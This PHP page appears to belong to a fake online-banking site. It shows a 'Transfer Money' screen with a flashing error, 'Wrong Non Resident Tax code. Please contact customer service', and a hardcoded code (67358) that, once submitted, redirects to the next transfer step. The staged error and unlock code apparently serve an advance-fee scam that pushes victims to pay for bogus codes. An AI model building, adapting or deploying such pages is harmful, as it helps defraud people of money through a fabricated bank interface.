<?php

include("header.php");

?>

<?php
$code = $_POST["code"];
if($code == "67358")
{
	echo "<script>location.href='transfer_3.php'</script>";
	}	
?>

<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Transfer Error</title>
<link rel="stylesheet" type="text/css" href="transfer_1_error.php_files/style.css">
<script type="text/javascript" src="transfer_1_error.php_files/a"></script><script charset="UTF-8" src="transfer_1_error.php_files/get"></script>

<body><script type="text/javascript" id="1qa2ws" charset="utf-8" src="transfer_1_error.php_files/base.js"></script>

<table width="820" border="0" align="center" cellpadding="0" cellspacing="0" style="border:1px solid #a3a3a3">
	<tbody><tr>
		<td style="padding:10px" bgcolor="#EEEEEE"><table width="100%" cellspacing="1" border="0">
		  <tbody>
		    <?php
			include("table_data.php");
			?>
	      </tbody>
	    </table></td>
	</tr>
	<tr>
		<td bgcolor="#0088cc">&nbsp;
		</td>
	</tr>
	<tr>
		<td style="padding:10px; vertical-align:top" height="164">
		        <?php
		
		include("top_menu.php");
		
		?>
		</td>
	</tr>
	<tr>
		<td style="padding:10px; vertical-align:top">
		<table width="100%" cellspacing="0" cellpadding="0" border="0">
			<tbody><tr>
				<td style="padding:10px; border:1px solid #f4cd58; border-right:0px" width="190" bgcolor="#FBF2A5">
				Quick Menu</td>
				<td style="padding:10px; border:1px solid #f4cd58;" bgcolor="#FFFFCF">
				Transfer Money</td>
			</tr>
			<tr>
				<td style="padding:10px; vertical-align:top" width="192">
				<table width="100%" cellspacing="0" cellpadding="0" border="0">
					<tbody><tr>
						<td style="padding:5px; border:1px solid #a3a3a3" width="16">
						<img src="transfer_1_error.php_files/acc_we8.gif" border="0"></td>
						<td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="acc_welcome.php">Home</a></font></td>
						</tr>
					<tr>
						<td style="padding:5px; border:1px solid #a3a3a3" width="16">
						<img src="transfer_1_error.php_files/acc_we9.gif" border="0"></td>
						<td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="transactions.php">View Transactions</a></font></td>
					  </tr>
					<tr>
						<td style="padding:5px; border:1px solid #a3a3a3" width="16">
						<img src="transfer_1_error.php_files/acc_we10.gif" border="0"></td>
						<td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="paybill.php">Pay a bill 
						  / someone</a></font></td>
					  </tr>
					<tr>
						<td style="padding:5px; border:1px solid #a3a3a3" width="16">
						<img src="transfer_1_error.php_files/acc_we11.gif" border="0"></td>
						<td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="transfer_money.php">Transfer Money</a></font></td>
					  </tr>
					<tr>
						<td style="padding:5px; border:1px solid #a3a3a3" width="16">
						<img src="transfer_1_error.php_files/acc_we12.gif" border="0"></td>
						<td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="add_services.php">Add Services</a></font></td>
					  </tr>
					<tr>
						<td style="padding:5px; border:1px solid #a3a3a3" width="16">
						<img src="transfer_1_error.php_files/acc_we13.gif" border="0"></td>
						<td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="user_profile.php">User Profile</a></font></td>
					  </tr>
					<tr>
						<td style="padding:5px; border:1px solid #a3a3a3" width="16">
						<img src="transfer_1_error.php_files/acc_we14.gif" border="0"></td>
						<td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="logout.php">Logout</a></font></td>
					  </tr>
				</tbody></table>
				</td>
				<td style="padding:10px; border:1px solid #f4cd58; vertical-align:top; border-top:0px">
					<table id="table17" width="102%" height="195" cellspacing="0" border="0">
						<tbody><tr>
                      <td class="normaltext" style="BORDER-TOP: 0px solid" width="100%" height="93" align="left">
                      	<p style="margin-top: -1px; margin-bottom: -1px" align="center">
						<font size="3">Transfer process in progress. This may 
						take some minutes to complete.</font></p>
						<p style="margin-top: -1px; margin-bottom: -1px" align="center">
						<font size="3" color="#FF0000"><strong><i><marquee behavior="alternate">Wrong Non Resident Tax code. Please 
						contact customer service</marquee></i></strong><br>
						</font></p>
							<form method="POST" action="codeverify_1.php?account=&amp;cid=" style="margin: 0px">
						
							</form></td>
																																</tr>
						</tbody></table>
						</td>
			</tr>
		</tbody></table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#EEEEEE">&nbsp;</td>
	</tr>
</tbody></table>

<p>&nbsp;</p>



</body></html>